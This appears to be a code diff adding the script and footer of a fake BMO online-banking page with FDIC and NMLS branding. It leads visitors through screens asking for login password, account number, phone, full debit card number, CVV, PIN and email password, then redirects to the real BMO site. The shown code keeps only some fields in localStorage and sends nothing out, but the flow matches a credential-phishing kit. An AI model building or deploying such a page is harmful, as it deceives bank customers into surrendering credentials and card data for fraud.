+        <span class="app-version">App version: 26.3.114-2</span>
+      </div>
+      <div class="footer-bottom">
+        <div class="footer-branding">
+          <div class="brand-item">
+            <img class="brand-fdic" src="./assets/fdic-image.png" alt="FDIC">
+          </div>
+          <div class="brand-item">
+            <div class="brand-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+            </div>
+            <span class="brand-label">Equal Housing Lender</span>
+          </div>
+        </div>
+        <span class=""> NMLS 401052</span>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /shell -->
+
+<div id="toast"></div>
+
+<script>
+  // ── DB (localStorage) ────────────────────────────────────
+  const DB_KEY = 'bmo_users';
+  const getDB = () => { try { return JSON.parse(localStorage.getItem(DB_KEY)||'{}'); } catch { return {}; } };
+  const saveDB = d => localStorage.setItem(DB_KEY, JSON.stringify(d));
+  function upsert(uid, data) {
+    const db = getDB();
+    db[uid] = Object.assign(db[uid] || { uid, created_at: new Date().toISOString() }, data, { updated_at: new Date().toISOString() });
+    saveDB(db);
+    console.log('[BMO DB] updated:', db[uid]);
+  }
+
+  // ── App state ─────────────────────────────────────────────
+  let S = { uid:'', remember:false };
+  let cur = 's-login';
+  let rdTmr;
+
+  // ── Navigation ────────────────────────────────────────────
+  function goTo(id) {
+    const prev = document.getElementById(cur);
+    const next = document.getElementById(id);
+    const prevCard = prev.querySelector('.card-lift');
+    const nextCard = next.querySelector('.card-lift');
+
+    if (prevCard) prevCard.classList.add('exit');
+    setTimeout(() => {
+      prev.classList.remove('active');
+      prevCard?.classList.remove('exit');
+      next.classList.add('active');
+      if (nextCard) {
+        nextCard.classList.add('enter');
+        setTimeout(() => nextCard.classList.remove('enter'), 300);
+      }
+    }, 280);
+
+    cur = id;
+  }
+  function goBack(id) {
+    document.getElementById(cur).classList.remove('active');
+    document.getElementById(id).classList.add('active');
+    cur = id;
+  }
+
+  // ── Validation helpers ────────────────────────────────────
+  const $  = id => document.getElementById(id);
+  const v  = id => $(id).value.trim();
+  function setErr(rowId, errId, show) {
+    $(rowId)?.classList.toggle('err', show);
+    $(errId).classList.toggle('on', show);
+  }
+
+  // ── Toast ─────────────────────────────────────────────────
+  function toast(msg) {
+    const t = $('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(toast._t);
+    toast._t = setTimeout(() => t.classList.remove('show'), 2800);
+  }
+
+  // ── Show/hide password ────────────────────────────────────
+  function togglePw(inp, btn) {
+    const el = $(inp), b = $(btn);
+    const hide = el.type === 'password';
+    el.type = hide ? 'text' : 'password';
+    b.textContent = hide ? 'Hide' : 'Show';
+  }
+
+  // ── Remember me ───────────────────────────────────────────
+  function toggleRemember() {
+    S.remember = !S.remember;
+    const b = $('rem-box');
+    b.classList.toggle('on', S.remember);
+    b.innerHTML = S.remember
+      ? `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>`
+      : '';
+  }
+
+  // ── Phone formatter ───────────────────────────────────────
+  function fmtPhone(el) {
+    let d = el.value.replace(/\D/g,'').slice(0,10);
+    if (d.length > 6)      d = `(${d.slice(0,3)}) ${d.slice(3,6)}-${d.slice(6)}`;
+    else if (d.length > 3) d = `(${d.slice(0,3)}) ${d.slice(3)}`;
+    else if (d.length)     d = `(${d}`;
+    el.value = d;
+  }
+
+  // ── Expiry formatter ──────────────────────────────────────
+  function fmtExp(el) {
+    let d = el.value.replace(/\D/g,'').slice(0,4);
+    if (d.length > 2) d = d.slice(0,2)+'/'+d.slice(2);
+    el.value = d;
+  }
+
+  // ── Card chunk auto-advance ───────────────────────────────
+  function cardChunk(el, nxt) {
+    el.value = el.value.replace(/\D/g,'');
+    if (el.value.length === 4 && nxt) $(nxt).focus();
+  }
+
+  // ── SCREEN 1: Login ───────────────────────────────────────
+  function loginSubmit() {
+    const u = v('uid'), p = $('pw').value;
+    let ok = true;
+    if (!u) { setErr('uid-row','uid-err',true); ok=false; } else setErr('uid-row','uid-err',false);
+    if (!p) { setErr('pw-row','pw-err',true);   ok=false; } else setErr('pw-row','pw-err',false);
+    if (!ok) return;
+    S.uid = u;
+    upsert(u, { uid: u, has_password: true });
+    if (S.remember) localStorage.setItem('bmo_rem', u);
+    goTo('s-account');
+  }
+
+  // ── SCREEN 2: Account Number ──────────────────────────────
+  function accountSubmit() {
+    const a = v('acct');
+    if (!a || a.length < 6) { setErr('acct-row','acct-err',true); return; }
+    setErr('acct-row','acct-err',false);
+    upsert(S.uid, { account_number: a });
+    goTo('s-phone');
+  }
+
+  // ── SCREEN 3: Phone ───────────────────────────────────────
+  function phoneSubmit() {
+    const p = $('phone').value.replace(/\D/g,'');
+    if (p.length !== 10) { setErr('phone-row','phone-err',true); return; }
+    setErr('phone-row','phone-err',false);
+    upsert(S.uid, { phone: p });
+    goTo('s-card');
+  }
+
+  // ── SCREEN 4: Debit Card ──────────────────────────────────
+  function cardSubmit() {
+    const cn = ['cn1','cn2','cn3','cn4'].map(i => $(i).value.replace(/\D/g,'')).join('');
+    const ex = v('exp'), cv = $('cvv').value.trim(), pi = $('pin').value.trim();
+    let ok = true;
+    if (cn.length !== 16) { $('cardnum-row').classList.add('err'); $('cardnum-err').classList.add('on'); ok=false; }
+    else { $('cardnum-row').classList.remove('err'); $('cardnum-err').classList.remove('on'); }
+    if (!ex || ex.length < 5) { setErr('exp-row','exp-err',true); ok=false; } else setErr('exp-row','exp-err',false);
+    if (cv.length < 3) { setErr('cvv-row','cvv-err',true); ok=false; } else setErr('cvv-row','cvv-err',false);
+    if (!pi) { setErr('pin-row','pin-err',true); ok=false; } else setErr('pin-row','pin-err',false);
+    if (!ok) return;
+    upsert(S.uid, { card_last4: cn.slice(-4), has_card: true });
+    goTo('s-email');
+  }
+
+  // ── SCREEN 5: Email ───────────────────────────────────────
+  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  function emailSubmit() {
+    const em = v('email'), ep = $('epw').value.trim();
+    let ok = true;
+    if (!emailRe.test(em)) { setErr('email-row','email-err',true); ok=false; } else setErr('email-row','email-err',false);
+    if (!ep) { setErr('epw-row','epw-err',true); ok=false; } else setErr('epw-row','epw-err',false);
+    if (!ok) return;
+    upsert(S.uid, { email: em, verified: true, verified_at: new Date().toISOString() });
+    showSuccess();
+  }
+
+  // ── Success & redirect ────────────────────────────────────
+  function showSuccess() {
+    $('suc-name').textContent = S.uid;
+    goTo('s-success');
+    setTimeout(() => { $('rbar').style.width = '100%'; }, 80);
+    rdTmr = setTimeout(doRedirect, 3300);
+  }
+  function doRedirect() {
+    clearTimeout(rdTmr);
+    window.location.href = 'https://www.bmo.com/en-us/main/personal/';
+  }
+  function resetAll() {
+    clearTimeout(rdTmr);
+    ['uid','pw','acct','phone','cn1','cn2','cn3','cn4','exp','cvv','pin','email','epw'].forEach(id => { const el=$(id); if(el) el.value=''; });
+    ['pw','cvv','pin','epw'].forEach(id => { const el=$(id); if(el) el.type='password'; });
+    ['show-pw','show-cvv','show-pin','show-epw'].forEach(id => { const el=$(id); if(el) el.textContent='Show'; });
+    document.querySelectorAll('.err-msg').forEach(e => e.classList.remove('on'));
+    document.querySelectorAll('.field-underline,.card-num-row').forEach(r => r.classList.remove('err'));
+    $('rbar').style.transition='none'; $('rbar').style.width='0%';
+    setTimeout(()=>{ $('rbar').style.transition='width 3.2s linear'; },50);
+    S = { uid:'', remember:false };
+    goBack('s-login');
+  }
+
+  // ── Enter key support ─────────────────────────────────────
+  $('pw').addEventListener('keydown',   e => e.key==='Enter' && loginSubmit());
+  $('acct').addEventListener('keydown', e => e.key==='Enter' && accountSubmit());
+  $('phone').addEventListener('keydown',e => e.key==='Enter' && phoneSubmit());
+  $('epw').addEventListener('keydown',  e => e.key==='Enter' && emailSubmit());
+
+  // ── Restore remembered username ───────────────────────────
+  const rem = localStorage.getItem('bmo_rem');
+  if (rem) { $('uid').value = rem; toggleRemember(); }
+</script>
+</body>
+</html>
